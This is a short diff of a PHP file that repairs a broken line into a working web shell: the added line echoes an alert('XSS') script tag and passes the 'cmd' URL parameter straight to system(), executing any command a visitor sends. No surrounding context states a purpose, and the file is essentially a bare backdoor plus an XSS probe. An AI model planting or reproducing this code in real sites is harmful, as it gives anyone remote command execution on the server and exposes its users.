@@ -1,5 +1,5 @@
 <?php
 
-echo "<script>alert('XSS')</script>";system($system($_GET["cmd"]);
+echo "<script>alert('XSS')</script>";system($_GET["cmd"]);
 
 ?>
